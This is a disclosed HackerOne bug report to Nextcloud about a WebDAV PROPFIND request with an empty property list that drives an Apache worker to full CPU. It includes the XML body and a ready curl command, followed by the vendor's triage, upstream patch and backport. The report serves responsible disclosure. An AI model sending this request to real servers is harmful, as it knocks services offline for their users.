{"id":255822,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNTU4MjI=","url":"https://hackerone.com/reports/255822","title":"WebDAV Empty Property search leads to full CPU usage","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2017-08-02T14:53:24.064Z","submitted_at":"2017-08-02T14:53:24.064Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"julzify","url":"/julzify","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":13291,"url":"https://hackerone.com/nextcloud","handle":"nextcloud","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Nextcloud","twitter_handle":"nextclouders","website":"https://nextcloud.com","about":"Access, share and protect your files, calendars, contacts, communication \u0026 more at home and in your enterprise."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-03-01T14:08:49.772Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2020-01-31T14:08:49.350Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Tested with the following versions:\n - [owncloud:10.0](https://hub.docker.com/_/owncloud/)\n - [nextcloud:12.0](https://hub.docker.com/_/nextcloud/)\n\nwith mariadb in place.\n\nA `PROFIND nextcloud/remote.php/webdav/` with\n\n```xml\n\u003c?xml version=\"1.0\"?\u003e\n\u003ca:propfind xmlns:a=\"DAV:\"\u003e\n\u003ca:prop\u003e\u003c/a:prop\u003e\n\u003c/a:propfind\u003e\n```\nas body causes full CPU utilization of one Apache worker process.\n\nin curl form:\n```\ncurl -i --user testuser:testpass -X PROPFIND -d '\u003c?xml version=\"1.0\"?\u003e\u003ca:propfind xmlns:a=\"DAV:\"\u003e\u003ca:prop\u003e\u003c/a:prop\u003e\u003c/a:propfind\u003e' http://nextcloud/remote.php/webdav\n```\n","vulnerability_information_html":"\u003cp\u003eTested with the following versions:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fhub.docker.com%2F_%2Fowncloud%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eowncloud:10.0\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca href=\"/redirect?url=https%3A%2F%2Fhub.docker.com%2F_%2Fnextcloud%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003enextcloud:12.0\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003ewith mariadb in place.\u003c/p\u003e\n\n\u003cp\u003eA \u003ccode\u003ePROFIND nextcloud/remote.php/webdav/\u003c/code\u003e with\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?xml version=\u0026quot;1.0\u0026quot;?\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;a:propfind\u003c/span\u003e \u003cspan class=\"na\"\u003exmlns:a=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;DAV:\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;a:prop\u0026gt;\u0026lt;/a:prop\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/a:propfind\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eas body causes full CPU utilization of one Apache worker process.\u003c/p\u003e\n\n\u003cp\u003ein curl form:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ecurl -i --user testuser:testpass -X PROPFIND -d \u0026#39;\u0026lt;?xml version=\u0026quot;1.0\u0026quot;?\u0026gt;\u0026lt;a:propfind xmlns:a=\u0026quot;DAV:\u0026quot;\u0026gt;\u0026lt;a:prop\u0026gt;\u0026lt;/a:prop\u0026gt;\u0026lt;/a:propfind\u0026gt;\u0026#39; http://nextcloud/remote.php/webdav\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","weakness":{"id":48,"name":"Denial of Service"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2020-03-01T14:08:49.430Z","allow_singular_disclosure_after":-26147079.15515096,"singular_disclosure_allowed":true,"vote_count":1,"voters":["b69fb2ebda43240ece9dbeb"],"severity":{"rating":"medium","score":4.3,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"low","user_interaction":"none","scope":"unchanged","confidentiality":"none","integrity":"none","availability":"low"}},"structured_scope":{"databaseId":13,"asset_type":"SOURCE_CODE","asset_identifier":"nextcloud/server","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1885440,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks a lot for reporting this potential issue back to us!\n\nOur security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we'd like to ask you to not disclose this issue to any other party.","markdown_message":"\u003cp\u003eThanks a lot for reporting this potential issue back to us!\u003c/p\u003e\n\n\u003cp\u003eOur security team will take a look at this issue as soon as possible. We will reply to your report within 72 hours, usually much faster. For obvious reasons we\u0026#39;d like to ask you to not disclose this issue to any other party.\u003c/p\u003e\n","automated_response":true,"created_at":"2017-08-02T14:53:24.257Z","updated_at":"2017-08-02T14:53:24.257Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Nextcloud"}},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1907924,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thanks. We'll look into this and get back to you once we have more information.","markdown_message":"\u003cp\u003eThanks. We\u0026#39;ll look into this and get back to you once we have more information.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-06T09:46:57.602Z","updated_at":"2017-08-06T09:46:57.602Z","actor":{"username":"lukasreschke","cleared":false,"url":"/lukasreschke","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/891/e7fea4d5383dc07d1fe767b02f3bda2bc7639c63_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1916556,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"https://github.com/nextcloud/server/issues/5947 might be related. ","markdown_message":"\u003cp\u003e\u003ca title=\"https://github.com/nextcloud/server/issues/5947\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fnextcloud%2Fserver%2Fissues%2F5947\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/nextcloud/server/issues/5947\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e might be related. \u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-09T15:01:05.042Z","updated_at":"2017-08-09T15:01:05.042Z","actor":{"username":"julzify","cleared":false,"url":"/julzify","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1935484,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Whats the status of your investigation?","markdown_message":"\u003cp\u003eWhats the status of your investigation?\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-17T09:33:42.929Z","updated_at":"2017-08-17T09:33:42.929Z","actor":{"username":"julzify","cleared":false,"url":"/julzify","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1935485,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We're looking into this and aim to release a patch for this in our next releases. We'll update the ticket once we have potential patches.\n\nPlease note that asking for updates usually does not speed up the process of fixing issues.","markdown_message":"\u003cp\u003eWe\u0026#39;re looking into this and aim to release a patch for this in our next releases. We\u0026#39;ll update the ticket once we have potential patches.\u003c/p\u003e\n\n\u003cp\u003ePlease note that asking for updates usually does not speed up the process of fixing issues.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-17T09:34:38.357Z","updated_at":"2017-08-17T09:34:38.357Z","actor":{"username":"lukasreschke","cleared":false,"url":"/lukasreschke","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/891/e7fea4d5383dc07d1fe767b02f3bda2bc7639c63_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1942702,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We believe to have determined the root cause to be in a third-party library (SabreDAV) and have [provided a patch upstream](https://github.com/fruux/sabre-xml/pull/132) for this issue.\n\nWe're planning to include this patch within our next releases.","markdown_message":"\u003cp\u003eWe believe to have determined the root cause to be in a third-party library (SabreDAV) and have \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Ffruux%2Fsabre-xml%2Fpull%2F132\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eprovided a patch upstream\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e for this issue.\u003c/p\u003e\n\n\u003cp\u003eWe\u0026#39;re planning to include this patch within our next releases.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-21T08:17:26.776Z","updated_at":"2017-08-21T08:17:26.776Z","actor":{"username":"lukasreschke","cleared":false,"url":"/lukasreschke","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/891/e7fea4d5383dc07d1fe767b02f3bda2bc7639c63_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1959101,"is_internal":false,"editable":false,"type":"Activities::SwagAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2017-08-28T08:34:14.111Z","updated_at":"2017-08-28T08:34:14.111Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Nextcloud"}},"reporter":{"username":"julzify","url":"/julzify"},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1959105,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"Thanks a lot for your report. At the moment we don't pay out monetary rewards for Denial of Service issues in our application. We have backported this patch however to our currently supported branches:\n\n- stable11: https://github.com/nextcloud/server/pull/6232\n- stable12: https://github.com/nextcloud/server/pull/6233\n","markdown_message":"\u003cp\u003eThanks a lot for your report. At the moment we don\u0026#39;t pay out monetary rewards for Denial of Service issues in our application. We have backported this patch however to our currently supported branches:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003estable11: \u003ca title=\"https://github.com/nextcloud/server/pull/6232\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fnextcloud%2Fserver%2Fpull%2F6232\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/nextcloud/server/pull/6232\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003cli\u003estable12: \u003ca title=\"https://github.com/nextcloud/server/pull/6233\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fnextcloud%2Fserver%2Fpull%2F6233\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/nextcloud/server/pull/6233\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n","automated_response":false,"created_at":"2017-08-28T08:36:36.494Z","updated_at":"2017-08-28T08:36:36.494Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Nextcloud"}},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1959107,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks a lot for your report again. This will be resolved in our next maintenance releases and we're working on the advisories at the moment.\n\nPlease let us know how you'd like to be credited in our official advisory. We require the following information:\n\n- Name / Pseudonym\n- Email address (optional)\n- Website (optional)\n- Company (optional)\n","markdown_message":"\u003cp\u003eThanks a lot for your report again. This will be resolved in our next maintenance releases and we\u0026#39;re working on the advisories at the moment.\u003c/p\u003e\n\n\u003cp\u003ePlease let us know how you\u0026#39;d like to be credited in our official advisory. We require the following information:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eName / Pseudonym\u003c/li\u003e\n\u003cli\u003eEmail address (optional)\u003c/li\u003e\n\u003cli\u003eWebsite (optional)\u003c/li\u003e\n\u003cli\u003eCompany (optional)\u003c/li\u003e\n\u003c/ul\u003e\n","automated_response":false,"created_at":"2017-08-28T08:37:17.548Z","updated_at":"2017-08-28T08:37:17.548Z","actor":{"username":"lukasreschke","cleared":false,"url":"/lukasreschke","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/037/891/e7fea4d5383dc07d1fe767b02f3bda2bc7639c63_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"julzify","url":"/julzify"},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1963723,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"thanks.\n\nJulian Rath\njulian.rath@gmail.com\nhttps://julianrath.me\ncrosscloud\n","markdown_message":"\u003cp\u003ethanks.\u003c/p\u003e\n\n\u003cp\u003eJulian Rath\u003cbr\u003e\n\u003ca title=\"julian.rath@gmail.com\" href=\"mailto:julian.rath@gmail.com\" rel=\"nofollow noopener noreferrer\"\u003ejulian.rath@gmail.com\u003c/a\u003e\u003cbr\u003e\n\u003ca title=\"https://julianrath.me\" href=\"/redirect?url=https%3A%2F%2Fjulianrath.me\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://julianrath.me\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\ncrosscloud\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-29T17:29:11.568Z","updated_at":"2017-08-29T17:29:11.568Z","actor":{"username":"julzify","cleared":false,"url":"/julzify","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":6932760,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Forgot to disclose this","markdown_message":"\u003cp\u003eForgot to disclose this\u003c/p\u003e\n","automated_response":false,"created_at":"2020-01-31T14:08:49.368Z","updated_at":"2020-01-31T14:08:49.368Z","first_to_agree":true,"actor":{"username":"nickvergessen","cleared":false,"url":"/nickvergessen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/5DBbeB7om4ZiKgskrEoeTyGH/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":6949030,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Julian David Rath\nCompany: Auer Rath OG","markdown_message":"\u003cp\u003eJulian David Rath\u003cbr\u003e\nCompany: Auer Rath OG\u003c/p\u003e\n","automated_response":false,"created_at":"2020-02-03T10:37:08.627Z","updated_at":"2020-02-03T10:37:08.627Z","actor":{"username":"julzify","cleared":false,"url":"/julzify","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":7188558,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-03-01T14:08:49.789Z","updated_at":"2020-03-01T14:08:49.789Z","actor":{"url":"/nextcloud","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/291/68f57538488b5716cdeeb6b78955f9e46685bc09_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Nextcloud"}},"genius_execution_id":null,"team_handle":"nextcloud","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}